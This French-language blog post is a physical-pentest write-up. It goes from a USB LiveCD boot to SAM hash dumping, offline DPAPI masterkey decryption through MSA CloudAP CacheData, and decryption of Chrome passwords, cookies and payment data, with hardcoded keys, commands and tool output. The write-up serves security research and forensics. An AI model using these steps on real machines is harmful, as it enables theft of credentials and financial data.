---
layout: post
title: "Physical Pentest : From the Login Screen to Full Compromise"
date: 2026-09-15
categories: [security, research]
tags: [red team, windows, dfir, cachedata, msa, app-bound-encryption, browser-forensics, chrome-decryption]
author: 
description: "A follow-up technical deep-dive for DFIR practitioners and pentesters, covering a masterkey rotation fix for Chrome's offline decryption and MSA CloudAP CacheData decryption."
---

![](/assets/img/preview.png){: .shadow }

> **Disclaimer** : Cet article est destiné à la recherche en sécurité informatique et à des fins éducatives uniquement. Les techniques présentées doivent être utilisées exclusivement sur des systèmes vous appartenant ou pour lesquels vous disposez d'une autorisation explicite.  

---

## Introduction
 
Cet article documente une exploration personnelle de pentest physique, inspirée d'un cas réel d'opération **Red Team** que j'ai effectué : d'un simple écran de login à un bruteforce interminable, pour finalement finir au fin fond du mécanisme **DPAPI** de Windows suivi de tout ce qui en suit.
 
Le point de départ était simple : partir d'un écran de connexion Windows et réussir à récupérer le disque du PC afin d'en extraire les données sur une clé USB, pour effectuer une analyse forensic entièrement **offline**.
 
---
 
## 1. Physical Access to the System
 
La première étape d'un pentest physique consiste à évaluer la robustesse des protections en amont du système d'exploitation lui-même : **Secure Boot**, chiffrement du disque, et configuration du **BIOS/UEFI**, dans ce cas précis, aucune de ces protections n'était activée, un scénario encore très fréquent sur des postes d'entreprise, en particulier dans les petites structures type ESN, ou plus largement au sein des collectivités (mairies, etc..)
 
### 1.1 BIOS/UEFI Access and Boot Order Modification
 
En redémarrant la machine et en interceptant le POST (touche `F2`, `F12`, `Suppr` ou `Échap` selon le constructeur), on accède au **BIOS**.
L'objectif ici est simple : modifier l'ordre de démarrage (**boot order**) pour prioriser un démarrage sur une clé USB bootable plutôt que le disque interne.

![](/assets/img/bios.jpg)
*Figure 1: BIOS set to boot from USB CD-ROM first.*

Deux éléments critiques ont rendu cette étape triviale :
 
- Le **BIOS** n'était pas protégé par mot de passe, ce qui laisse un accès total à la configuration de démarrage.
- Le **Secure Boot** était désactivé, ce qui permet de booter n'importe quel exécutable `UEFI`, signé ou non, y compris un LiveCD Linux non signé par Microsoft.

### 1.2 Booting Debian LiveCD and Mounting the NTFS Partition
 
Une fois le boot order modifié, on démarre sur la clé USB Debian en mode Live, l'intérêt du **LiveCD** est qu'il s'exécute entièrement en RAM, sans toucher au disque interne, portable, et donne un accès root complet à un environnement Linux.
 
Une fois dans l'environnement, on identifie les partitions du disque interne pour repérer la partition principale Windows `NTFS`, on crée un point de montage et on monte la partition :

![](/assets/img/mount_ntfs.png)
*Figure 2: Mounting the Windows NTFS partition from the LiveCD.*

**Pourquoi ça fonctionne : l'absence de BitLocker !**
 
C'est ici que réside la vraie faille, sans **BitLocker** (ou tout autre chiffrement au niveau disque), le contenu de la partition `NTFS` est stocké en clair sur le support physique, le driver `ntfs-3g`, présent nativement sur la plupart des distributions Linux, permet un accès en lecture (et écriture) complet à cette partition sans aucune authentification nécessaire.
 
> BitLocker reste la protection la plus dissuasive, mais pas absolue : des attaques de type **TPM sniffing**, documentées par plusieurs chercheurs, permettent d'intercepter la clé BitLocker sur le bus `LPC`/`SPI` au démarrage avec un accès physique à la carte mère. En pratique, ça reste une attaque hardware qui demande du matériel et du temps.
{: .prompt-info }

À ce stade, on dispose d'un accès total, complet à absolument tout ce qui peut exister sur un système Windows : fichiers système, configuration, et surtout l'intégralité des sessions de chaque compte utilisateur s'étant un jour connecté sur la machine, profils, fichiers personnels, paramètres, historiques, données applicatives associées ... **Absolutely everything.**

Un petit aperçu sur l'arborescence du disque :
 
```bash
drwxrwxrwx 1 root root      12288 Jun  7  2025 '$Recycle.Bin'
drwxrwxrwx 1 root root          0 Nov 21  2025 '$WINDOWS.~BT'
drwxrwxrwx 1 root root          0 Nov 21  2025 '$Windows.~WS'
-rwxrwxrwx 1 root root        112 Jan 10  2021  bootTel.dat
drwxrwxrwx 1 root root     655360 Sep  9 23:16  Config.Msi
drwxrwxrwx 1 root root          0 May  7  2025  DownLoadiTunes
-rwxrwxrwx 2 root root      12288 Oct 10  2025  DumpStack.log
-rwxrwxrwx 2 root root      12288 Sep 10 11:43  DumpStack.log.tmp
drwxrwxrwx 1 root root          0 Nov 21  2025  ESD
-rwxrwxrwx 1 root root 3358330880 Sep 10 11:43  hiberfil.sys
drwxrwxrwx 1 root root          0 Sep  1  2025  inetpub
drwxrwxrwx 1 root root          0 May  8  2025  Log
drwxrwxrwx 1 root root          0 Nov 24  2021  Logs
-rwxrwxrwx 1 root root 3623878656 Sep 10 11:43  pagefile.sys
drwxrwxrwx 1 root root          0 Apr  1  2024  PerfLogs
drwxrwxrwx 1 root root      16384 Sep  5 07:32  ProgramData
drwxrwxrwx 1 root root      16384 Sep  5 21:14 'Program Files'
drwxrwxrwx 1 root root      12288 Sep  8 14:13 'Program Files (x86)'
drwxrwxrwx 1 root root       4096 Sep  2  2025  Recovery
drwxrwxrwx 1 root root          0 Oct 12  2025  RecoveryWSL
-rwxrwxrwx 1 root root   16777216 Sep 10 11:43  swapfile.sys
drwxrwxrwx 1 root root       8192 Sep 10 12:34 'System Volume Information'
drwxrwxrwx 1 root root          0 Jun  9 15:48  Temp
drwxrwxrwx 1 root root       4096 Oct 15  2025  Users
drwxrwxrwx 1 root root      28672 Sep  9 23:15  Windows
drwxrwxrwx 1 root root      12288 Sep 18  2022  xampp
```
 
---
 
## 2. Local Hash Extraction (SAM)
 
Une des premières choses à tester sur une copie de disque Windows reste un classique : extraire les hashes locaux stockés dans la base `SAM`, protégée par la clé système présente dans la hive `SYSTEM`, avec Impacket :
 
```bash
$ secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies
 
[*] Target system bootKey: 0xb2481da406218049e5d69d9c871821c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrateur:500:aae7b435b51404bbaad3b435b51404ee:31d6cfb0d16ae931b73c58d7e0c019c0:::
Invité:501:aad3b435b51401eeaad3b435c31404eb:31f7cfc0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b491b51404egaad3b645b51404ee:31d6cae1d16ae811b73c59d9e0c089c0:::
WDAGUtilityAccount:504:aad3b435b58404eeaad3d92b51405ee:30e35f5b78ed72e74ad21fa9d892f5f8:::
goten:1001:3e3e338becf7731862434ef735dc4d93:d3ff98bd0da32ff3a457e29584fe6844:::
WsiAccount:1055:aed3b465b54404eeaad3b435b51494ee:08970ae20ef72ab4609b1a8d5ae0f913:::
[*] Cleaning up…
```
{: .nolineno }
 
Le hash **NTLM** `d3ff98bd0da32ff3a457e29584fe6844` correspond à l'utilisateur ciblé (`goten`), après un long bruteforce le mot de passe en clair est retrouvé : `Freecss66*`.  
Après test, le mot de passe obtenu s'est avéré être exactement le même que celui utilisé pour le compte **Microsoft (MSA)** lié à cet utilisateur Windows, ce mot de passe microsoft récupéré nous resservira un peu plus loin, puisqu'il sera indispensable pour l'étape suivante : le déchiffrement de la **Master Key DPAPI**.
 
---
 
## 3. Offline DPAPI Masterkey Decryption from a TPM-Protected MSA Account

À ma connaissance, il n'existe aucune documentation technique publique détaillant le déchiffrement d'une **masterkey DPAPI** liée à un compte **Microsoft (MSA)**, ni plus généralement le déchiffrement du fichier **CacheData MSA** de CloudAP en **offline** — les ressources existantes couvrent soit les comptes locaux, soit les comptes Entra ID, en laissant systématiquement de côté le cas MSA + TPM actif que cette section documente.
 
### 3.1 How DPAPI Works and the Role of the Masterkey
 
Sous Windows, la **DPAPI (Data Protection API)** est le mécanisme utilisé par une quantité impressionnante de fonctionnalités pour chiffrer des données sensibles : les credentials Chrome, Edge, Brave, et Opera les identifiants Wi-Fi, le Gestionnaire d'identification Windows, les certificats, et bien d'autres.
Concrètement, chaque secret protégé par DPAPI (un " blob DPAPI ") n'est pas chiffré directement avec le mot de passe de l'utilisateur, mais avec une clé intermédiaire appelée **masterkey** qui est elle-même stockée sur le disque, chiffrée, dans le dossier :
 
```
C:\Users\<User>\AppData\Roaming\Microsoft\Protect\<SID_user>\
```
 
Dans notre cas :
 
```
\S-1-5-21-1165040952-93560433-1993425277-1001\
 
03bb0530-1139-4d7c-8fac-38e61418f8df
0c850636-8454-4552-bc2f-c403660ea707
0f6bbc6d-f70d-472f-90be-8331a5fab0a1
1ab0619c-c30f-4b9c-b262-6710dce02096
1ef05572-ecc5-498f-8815-4d14859ded3b
26799fdd-9730-4763-9e58-762c12914c6f
3999d0aa-4f87-474d-b175-4a0f312a4105
5d7c4930-68b9-4768-aaf9-26a7dc622d3e
70673d8e-daf9-436c-9f60-97273d7af462
74bd7ec3-f04b-4c98-9345-1c07e6fd2661
779e092c-6142-4b37-a75f-98ef4e16437b
835518d3-41b7-49ff-bd3f-08687adcc6ec
8904f43e-a3ce-434f-9f2b-e949889638aa
97252261-688d-4b6e-a139-3fec892f087e
acc714ee-ef04-4a37-812c-7a17a8d31b4d
b24aa0fe-fb17-4374-835a-083aa0ee1d01
ba12808c-9f23-4cf4-b377-087709f61778
bea7193c-71ed-4c7d-8cac-2d516c574a1d
d6f5db40-8ffb-495b-9c4c-d5582219f367
d8771e2f-d135-4472-9e60-4f8ec8734b88
d8945b74-5241-4eff-8a65-43cdc831c8c4
e2fc0f82-c680-4bde-be01-73b017aa07fd
f5bfc14e-57b4-4555-97a5-ae153a8ad09c
fffdaf8d-fb03-42b5-ab89-950dcfbd1f9c
Preferred
```
 
> Le fichier `Preferred` permet d'identifier la MasterKey actuellement utilisée par le système, ses 16 premiers octets contiennent le `GUID` de cette MasterKey, windows génère périodiquement une nouvelle MasterKey, tous les 90 jours environ, tout en conservant les anciennes afin de pouvoir continuer à déchiffrer les données protégées précédemment.
{: .prompt-info }

Pour déchiffrer un blob DPAPI, il faut donc deux ingrédients : le blob lui-même (qui référence le `GUID` de la masterkey utilisée, visible dans son header) et la masterkey déchiffrée correspondante.  
Toute la difficulté du sujet tient dans une question simple : comment déchiffrer cette masterkey ?
 
### 3.2 Domain, Local, or Microsoft: Three Masterkey Recovery Scenarios
 
En creusant le sujet, on tombe sur trois scénarios radicalement différents :
 
1. **Compte de domaine Active Directory** : Il existe un mécanisme de récupération via la **Domain Backup Key**, détenue par le DC, cependant, cela nécessite un accès (même indirect) à l'infrastructure du domaine et ne constitue donc pas un scénario purement offline.

2. **Compte Windows 100 % local** : le cas simple, la masterkey est chiffrée avec le `SHA1` du mot de passe compte.

3. **Compte local relié à un compte Microsoft**, c'est le cas de figure qu'on retrouve sur beaucoup de PC aujourd'hui, aussi bien côté particuliers qu'en entreprise, il y a deux variantes, qui reposent sur le même mécanisme (`cloudAP.dll`) mais qui diffèrent un peu dans les détails :
 
   - **Compte Microsoft personnel (MSA)** — un compte *@outlook.com*, *@hotmail.com*, ou même une adresse Gmail/autre enregistrée comme identifiant Microsoft, c'est le cas du poste ciblé, et le sujet de cet article.

   - **Compte professionnel/scolaire Entra ID** (anciennement Azure AD) — le fonctionnement est globalement similaire, mais le chemin des fichiers change (`CloudAPCache\AzureAD\`{: .filepath } au lieu de `CloudAPCache\MicrosoftAccount\`{: .filepath }), et surtout, comme on le verra plus loin, la structure interne du fichier **CacheData** diffère assez entre les deux pour que les mêmes outils ne fonctionnent pas forcément sur les deux types de caches, et particulièrement pour les comptes MSA.  

> Pour identifier depuis un disque Windows si le compte d'un utilisateur est un compte MSA ou Entra ID, il suffit de consulter le chemin suivant : `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache\MicrosoftAccount\<unique_hash>\Cache\CacheData`pour un compte MSA.   `\Local\Microsoft\Windows\CloudAPCache\AzureAD\<unique_hash>\Cache\CacheData`pour un compte Entra ID.
{: .prompt-info }

**Le piège du compte MSA**
 
Sur un compte MSA, ni le **PIN** de session, ni le **mot de passe** du compte **Microsoft** en clair ne servent directement à dériver la clé qui protège la masterkey. Windows génère en réalité un secret aléatoire propre à DPAPI, stocké sur le disque, lui-même protégé par un mécanisme différent selon la méthode de connexion utilisée par l'utilisateur : soit le **NGC/Windows Hello** (PIN), soit le fichier **CacheData/CloudAP** (mot de passe Microsoft).
 
Pour faire le lien avec un compte 100 % local : sur celui-ci, ce secret aléatoire est directement le mot de passe du compte, sur un compte MSA / Entra ID, il faut le retrouver en passant par une couche cryptographique supplémentaire.
 
### 3.3 First Approach: NGC/Windows Hello and the TPM Wall
 
Le mécanisme **NGC (Next Generation Credentials)** est celui utilisé par Windows Hello pour permettre de déverrouiller une session avec un simple PIN, la chaîne de déchiffrement, documentée en détail par Tijl Deneut (auteur de [dpapilab-ng](https://github.com/tijldeneut/dpapilab-ng)) dans [cet article](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/), se déroule ainsi :
 
- Parsing du dossier NGC (`Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc`)
- Déchiffrement d'un premier blob `RSA` privé via DPAPI, en utilisant les masterkeys System, les hives `SYSTEM`/`SECURITY`, et le PIN (dérivé en `PBKDF2-SHA256`, 10 000 itérations)
- Ce premier `RSA` déchiffre un " `DecryptPIN` "
- Ce `DecryptPIN` sert à répéter l'opération pour un second blob `RSA`
- Ce second `RSA` déchiffre cette fois une clé `AES`
- Cette clé `AES` est utilisée, avec un IV et un mot de passe chiffré récupérés dans le **Vault Windows** (lui-même protégé par DPAPI via la masterkey System), pour effectuer un déchiffrement `AES-CBC` final et obtenir le mot de passe en clair  

![](/assets/img/DPAPI-NG.png)
*Figure 3: Password decryption with [DPAPI-NG](https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/)*

Deux outils implémentent cette chaîne : [_ngc_full_auto.py](https://github.com/tijldeneut/dpapilab-ng/blob/main/_ngc_full_auto.py) et [diana-ngcpinpassdec.py](https://github.com/tijldeneut/diana/blob/main/diana-ngcpinpassdec.py), j'ai testé les deux, avec toutes les combinaisons de fichiers nécessaires récupérées depuis la copie complète du disque :
 
```
Windows/System32/config/{SOFTWARE,SYSTEM,SECURITY}
Windows/System32/Microsoft/Protect/S-1-5-18/User/
Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/
Windows/ServiceProfiles/LocalService/AppData/Roaming/Microsoft/Crypto/Keys/
Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28
```
 
Résultat, systématiquement :
 
```
[-] Protector "1" is probably being stored in the TPM chip.
```
![](/assets/img/meme.png)

C'est un mur connu et documenté : quand un **TPM** est actif, la clé privée qui protège le PIN n'est plus stockée dans un fichier accessible sur le disque mais scellée physiquement dans la puce. Impossible à extraire offline, uniquement via une session online (`ngc::pin` depuis `Mimikatz` , qui interroge directement le TPM).
 
### 3.4 Second Approach: CacheData/CloudAP — MSA & Entra ID

En creusant plus loin, on tombe sur les travaux de Synacktiv, présentés à [Troopers 2024](https://www.synacktiv.com/sites/default/files/2024-07/troopers2024_sayhellotoyournewcacheflow.pdf), qui documentent un second mécanisme totalement indépendant du TPM : le fichier **CacheData** géré par **CloudAP**, utilisé par Windows pour permettre une authentification hors ligne quand le PC ne peut pas contacter les serveurs Microsoft/Entra ID.
 
Sur un cache **Entra ID**, c'est notamment un **PRT (Primary Refresh Token)** qui est stocké, un artefact permettant la reconnexion même hors ligne.  
Sur un cache **MSA**, il n'y a pas de PRT à proprement parler : c'est l'artefact **`Passport.NET`**, hérité du vieux système Microsoft Passport, qui joue le même rôle.
 
Le fichier CacheData contient un ou plusieurs " noeuds ", chacun correspondant à une méthode d'authentification (PIN ou mot de passe). Le nœud de type password (`0x1`) se déchiffre via cette dérivation, la même que ce soit un compte MSA ou Entra ID :
 
```
clé = PBKDF2-HMAC-SHA256(mot_de_passe, salt vide, 10000 itérations, 32 octets)
donnée_déchiffrée = AES-256-CBC-Decrypt(blob_chiffré, clé, IV nul)
```
 
J'ai testé l'outil développé par Synacktiv, [decrypt_cachedata.py](https://github.com/synacktiv/CacheData_decrypt/) :
 
```bash
$ python3 decrypt_cachedata.py password -C CacheData -P password.txt
[+] CacheData node of type password (0x1) has been found
[+] End of bruteforce, no valid password found.
```
{: .nolineno }
 
En regardant le code, la raison est simple : le script valide le mot de passe en cherchant un `JSON` précis dans le blob déchiffré :
 
```python
idx = decrypted_blob.find(b'{"Version"')
if idx == -1:
    continue  # mot de passe rejeté
```

Ce JSON, c'est le `PRT`, présent sur un cache **Entra ID**, absent sur un cache **MSA**, le script rejette donc systématiquement le bon mot de passe, faute de trouver ce qu'il cherche.
 
Un premier script existait déjà pour gérer spécifiquement les comptes MSA, [diana-msaccountdec.py](https://github.com/tijldeneut/diana/blob/main/diana-msaccountdec.py) de Tijl Deneut, mais sa version d'origine (2022) est inapte à gérer un cache Entra ID / MSA récent.
 
J'ai trouvé une version mise à jour (2024) par Laxa de [ce même script](https://github.com/laxaa/diana/blob/main/diana-msaccountdec.py) qui implémente la bonne logique de déchiffrement pour les deux types de caches :
 
```python
if b'Version' in bClearData:
    # branche Entra ID : le PRT est là, sous format JSON
    version, flags, dword3, raw_dpapi_cred_key_size = struct.unpack("<IIII", bClearData[0:0x10])
    decrypted_prt = bClearData[0x70:]
    dpapi_cred_key_blob = bClearData[0x10:0x10 + raw_dpapi_cred_key_size]
    dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
    decrypted_prt_end = decrypted_prt.rfind(b'}')
    decrypted_prt = decrypted_prt[:decrypted_prt_end + 1]
    key = hashlib.sha1(dpapi_cred_key_blob_obj.CredKey).digest()
    j = json.loads(decrypted_prt)
    sid = j['UserInfo']['PrimarySid']
    encoded_sid = (sid + '\0').encode('UTF-16-LE')
    key = hmac.new(key, encoded_sid, hashlib.sha1).hexdigest()
    # extraction du CredKey (GUID + 64 octets), puis dérivation via SHA1 + HMAC avec le SID tiré du JSON
else:
    # branche MSA : pas de PRT, le mot de passe est directement en clair
    ## DPAPI Password should be at offset 48, length 88 bytes
    sPassword = bClearData[48:136].decode('UTF-16LE')
```
 
C'est cette version que j'ai utilisé, et qui a fonctionné : pas de **`"Version"`** trouvé dans le cache -> bascule automatique sur la branche MSA.  

![](/assets/img/cachedata_diag.png)
*Figure 4: CacheData (CloudAP) decryption workflow — MSA & Entra ID. (Click to zoom)*  

Place au déchiffrement du `Cache MSA`:

```bash
$ python3 diana-msaccountdec.py -f CacheData -p "Freecss66*"
```
{: .nolineno }

![](/assets/img/cachedata.png)
*Figure 5: Decrypting a CacheData file.*


### 3.5 Masterkey Decryption Using the DPAPI Secret
 
Avec le **secret DPAPI** en main, place au déchiffrement de la Masterkey :
 
```bash
$ dpapi.py masterkey -file 70673d8e-daf9-436c-9f60-97273d7af462 -password '<SecretDPAPI>' -sid S-1-5-21-1165040952-93560433-1993425277-1001
 
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies
 
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 70673d8e-daf9-436c-9f60-97273d7af462
Flags       :        5 (5)
Policy      :     7ffe (32766)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)
 
Decrypted key with User Key (SHA1)
Decrypted key: 0xa6a8f687baf3c133e126a1f4288c36bda5f63c0cf1d630391214f4eb9440fcd5ac861aaecbf9bc07b281bd688446481ec0fdcf61bebdf3712760ed9faf51250e
```
{: .nolineno }
 
Nous avons finalement réussi à déchiffrer en offline, une **MasterKey DPAPI** utilisateur associée à un compte **Microsoft (MSA)** protégé par **TPM** en passant par le **CacheData de CloudAP**.
 
Ce résultat démontre ainsi qu'un compte MSA / Entra ID protégé par TPM ne constitue pas un obstacle à un déchiffrement DPAPI entièrement offline, dès lors que les artefacts CloudAP nécessaires sont disponibles sur le système.
 
---
 
## 4. Offline Chrome Credentials Decryption
 
Les identifiants Chrome peuvent être protégés par deux mécanismes principaux : `v10`, l'ancien mécanisme de chiffrement, et `v20`, le nouveau mécanisme basé sur l'**App-Bound Encryption (ABE)**, mis en place récemment.
 
### 4.1 Before Chrome 127 — v10 Model
 
Chrome stockait sa clé **AES** dans `Local State`, champ `os_crypt.encrypted_key` — un simple blob DPAPI utilisateur préfixé par la chaîne `"DPAPI"`. La chaîne complète offline :
 
```
Local State → base64 decode → strip "DPAPI" (5 octets) → blob DPAPI standard
→ masterkey utilisateur (password + SID) → clé AES 32 octets (browser key)
→ Login Data (SQLite) → entrées préfixées "v10"
→ AES-256-GCM decrypt : [v10 (3o)] [IV (12o)] [ciphertext] [GCM tag (16o)]
→ mot de passe en clair
```
 
Problème fondamental du `v10` : n'importe quel processus tournant sous le compte utilisateur pouvait appeler `CryptUnprotectData` via l'API DPAPI Windows et obtenir la **Browser key** (clé AES 256) sans avoir besoin du mot de passe, sans rien, tous les infostealers exploitaient ça.
 
### 4.2 v20 Model — App-Bound Encryption (Chrome 127+ — July 2024)
 
Google a ajouté un nouveau champ dans `Local State` : `os_crypt.app_bound_encrypted_key`, préfixé `"APPB"`, les deux champs coexistent :
 
```js
{
  "os_crypt": {
    "encrypted_key": "DPAPI...", // v10, toujours présent
    "app_bound_encrypted_key": "APPB..." // v20, ajouté depuis Chrome 127
  }
}
```
{: .nolineno }
 
Le préfixe dans les premiers octets de chaque donnée chiffrée, qu'il s'agisse de mots de passe / cookies (`Login Data`) ou de données bancaires (`Web Data`) indique quel chemin prendre : `v10` renvoie à `encrypted_key`, `v20` renvoie à toute la chaîne **App-Bound**.
 
```
donnée chiffrée = [v10 ou v20 (3o)] [IV (12o)] [ciphertext] [TAG (16o)]
```
 
> Chrome ne re-chiffre jamais les anciennes données chiffrées quand il se met à jour, un mot de passe enregistré sous **Chrome 120** reste en `v10` même sur **Chrome 127+**.  
Toutes données que Chrome chiffre peuvent être préfixées par `v10` comme `v20` selon la version de Chrome active au moment de leur enregistrement, c'est le cas ici, avec un profil Chrome existant depuis plusieurs années.
{: .prompt-info }
 
### 4.3 The v20 Chain: Two DPAPI Layers Common to All Flags
 
```
app_bound_encrypted_key
→ strip "APPB"
→ blob1 : déchiffré avec masterkey SYSTEM
→ blob2 : déchiffré avec masterkey utilisateur
→ content = [flag (1o)] [données selon flag]
```
 
Une fois `blob2` déchiffré, le premier octet du contenu indique quelle méthode Chrome a utilisée pour chiffrer la **browser key** finale.
Trois valeurs possibles, correspondant à trois générations de la protection.
 
### 4.4 Flags 1, 2 and 3: Evolution of the Protection
 
**Flag=1 (Chrome 127-132)**
 
```
[flag=1 (1o)] [IV (12o)] [TAG (16o)] [ciphertext]
→ AES-256-GCM avec clé universelle hardcodée dans elevation_service.exe
```
 
```python
key = bytes.fromhex(
    "B31C6E241AC846728DA9C1FAC4936651"
    "CFFB944D143AB816276BCC6DA0284787"
)
browser_key = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
```
{: .nolineno }
 
**Flag=2 (Chrome 133-136)**
 
```
[flag=2 (1o)] [IV (12o)] [TAG (16o)] [ciphertext]
→ ChaCha20-Poly1305 avec clé universelle hardcodée dans elevation_service.exe
```
 
```python
key = bytes.fromhex(
    "E98F37D7F4E1FA433D19304DC2258042"
    "090E2D1D7EEA7670D41F738D08729660"
)
browser_key = ChaCha20_Poly1305.new(key=key, nonce=iv).decrypt_and_verify(ct, tag)
```
{: .nolineno }
 
Le problème de **`flag 1`** et **`flag 2`** : la clé hardcodée extraite du binaire `elevation_service.exe` par reverse et publiée publiquement était identique sur tous les Chromes pour une version donnée, il suffisait de la trouver une fois → la clé était dévoilée pour des **centaines de millions** de machines simultanément.  
Les deux couches DPAPI étaient toujours là, mais cette dernière étape universellement cassable rendait l'ensemble fragile.
 
**Flag=3 (Chrome 137+, Le cas qui nous intéresse)**
 
```
[flag=3 (1o)] [enc_key (32o)] [IV (12o)] [ciphertext (32o)] [TAG (16o)]
```
 
Plus de clé universelle, `enc_key` est chiffrée avec une clé unique par machine, stockée dans le **Key Storage Provider (KSP)** de Windows :
 
```
KSP file "Google Chromekey1" (C:\ProgramData\Microsoft\Crypto\SystemKeys)
→ DPAPI SYSTEM + entropy "xT5rZW5qVVbrvpuA\x00"
→ ksp_key (32 octets à l'offset 12)
→ AES-CBC(ksp_key, IV nul).decrypt(enc_key) → key1
→ key1 XOR xor_key → key2
→ AES-256-GCM(key2, IV).decrypt(ciphertext) → browser key
```
 
La `xor_key` est une constante de 32 octets, universelle et hardcodée dans `elevation_service.exe`, trouvée (encore) par reverse :
 
```python
xor_key = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C"
    "03A29E90274FB2FCF59BA4B75C392390"
)
```
{: .nolineno }

![](/assets/img/xor_key.png)
*Figure 6: XOR loop in elevation_service.exe with hardcoded constants — key1 XOR xor_key → key2*

Et l'entropie `xT5rZW5qVVbrvpuA`, la même constante que celle utilisée dans la dérivation **DPAPI-NG Decrypt RSA Private Key** du diagramme **NGC** en début d'article ! là où le `SHA512` du PIN se combine avec cette chaîne pour déchiffrer la clé privée RSA. Microsoft la réutilise visiblement à plusieurs endroits du système.
 
La vraie différence entre les trois flags se différentie uniquement par cette dernière étape :
 
| Flag | Mécanisme de protection | Résultat |
|------|--------------------------|----------|
| `flag=1` **(Chrome 127-132)** | Clé universelle hardcodée (AES-GCM) | Browser Key |
| `flag=2` **(Chrome 133-136)** | Clé universelle hardcodée (ChaCha20) | Browser Key |
| `flag=3` **(Chrome 137+)** | `ksp_key` unique par machine (AES-CBC + XOR) | Browser Key |

![](/assets/img/browser_diag.png)
*Figure 7: Chrome v10 & v20 offline decryption workflow. (Click to zoom)*

### 4.5 When Does app_bound_encrypted_key Actually Get Rewritten?
 
Le blob DPAPI `encrypted_key` (v10) est créé une seule fois à l'initialisation du profil Chrome, protégé **définitivement** par la masterkey utilisateur active **ce jour-là**, il ne change jamais (sauf reset complet du profil, réinstallation de Chrome).
 
`app_bound_encrypted_key` (v20) peut être régénéré, mais très rarement : à chaque fois que Chrome fait évoluer son mécanisme de protection (changement de flag), l'`elevation_service` demande l'application de la nouvelle méthode de protection.
 
Le mécanisme est documenté directement dans le code source de Chromium :
 
```
// https://chromium.googlesource.com/chromium/src/+/36e5343a18a8864e696dddba73e4078863db3f5c/chrome/browser/os_crypt/app_bound_encryption_win.h
// App-Bound may recommend re-encryption of the data, for example if the key
// has been rotated. If so, new_ciphertext will contain the re-encrypted
// data according to the protection_level specified.
```
 
Concrètement, à chaque lancement de Chrome, `OSCryptAsync` déclenche le déchiffrement de `app_bound_encrypted_key` pour obtenir **la Browser Key v20**, qui ensuite, question de performance reste en mémoire pour toute la session (elle sert à énormément de choses : déchiffrer des cookies, auto-remplir des credentials / données bancaires...). C'est à ce moment précis que l'elevation_service peut renvoyer un code `kSuccessShouldReencrypt`, un signal indiquant que le flag de protection doit changer. Si ce code est reçu, Chrome rappelle immédiatement `EncryptData()` pour réécrire `app_bound_encrypted_key` sous le nouveau mécanisme :


```cpp
// https://chromium.googlesource.com/chromium/src/+/5e1e7ebbc540905089d602ae3ebb51a63232df0e/chrome/browser/os_crypt/app_bound_encryption_win.cc
  if (base::FeatureList::IsEnabled(features::kAppBoundDataReencrypt) &&
      hr == elevation_service::Elevator::kSuccessShouldReencrypt) {
    DWORD encrypt_last_error;
    base::win::ScopedBstr reencrypted_data;
    if (flags) {
      protection_level = AddFlags(protection_level, *flags);
    }
    HRESULT encrypt_hr =
        elevator->EncryptData(protection_level, plaintext_data.Get(),
                              reencrypted_data.Receive(), &encrypt_last_error);
```
 
Chrome recrée alors les blobs DPAPI imbriqués (blob1 + blob2) et re-chiffre la Browser Key avec le nouveau flag. Les masterkeys SYSTEM et USER utilisées sont celles qui sont actives au moment de cette opération.
 
**En résumé, ce qu'il faut (cas offline, Chrome 137 +) :**
 
| Fichier | Chemin |
|---------|--------|
| SYSTEM | `Windows/System32/config/SYSTEM` |
| SECURITY | `Windows/System32/config/SECURITY` |
| Masterkey SYSTEM | `Windows/System32/Microsoft/Protect/S-1-5-18/User/<GUID>` |
| Masterkey utilisateur | `Users/<user>/AppData/Roaming/Microsoft/Protect/<SID>/<GUID>` |
| KSP ChromeKey1 *(Spécifique v20 flag=3)* | `ProgramData/Microsoft/Crypto/SystemKeys/<hexdigits>_<guid>` |
| Local State | `Users/<user>/AppData/Local/Google/Chrome/User Data/Local State` |
| Login Data | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Login Data` |
| Cookies | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies` |
| Web Data | `Users/<user>/AppData/Local/Google/Chrome/User Data/Default/Web Data` |
 
---
 
### 4.6 PoC Execution on Chrome 155
 
J'ai trouvé un script très récent d'Alfred Abston qui implémentait l'ensemble de ce mécanisme [chrome-decrypt-offline](https://github.com/aabston/chrome-decrypt-offline) cependant il n'était pas entièrement fonctionnel selon les cas, j'ai aussi implémenté la fonction permettant de déchiffrer les données bancaires stockées sur Chrome comme elles utilisent exactement le même mécanisme de chiffrement que les mots de passe / Cookies.  

Vous pouvez trouver la [Pull Request](https://github.com/aabston/chrome-decrypt-offline/pull/1) détaillant le problème du script originale, sa correction, et les nouvelles implémentations, ainsi que [le script](https://github.com/0rcruxe/chrome-decrypt-offline/blob/main/chrome-decrypt.py) mis à jour et totalement fonctionnel.
 
**Prérequis :** avant de commencer il faut d'abord obtenir le secret DPAPI system depuis les hives `SECURITY` ET `SYSTEM` pour déchiffrer la masterkey system :

![](/assets/img/secret_sys.png)
*Figure 8: Dumping DPAPI_SYSTEM secrets.*

Avec toutes les données nécessaire en main, il est maintenant possible de déchiffrer les credentials chrome :
 
```bash
python3 chrome-decrypt.py --decrypt -s "Local State" -l "Login Data" -c Cookies -w 'Web Data'
```
{: .nolineno }

![](/assets/img/credentials.png)
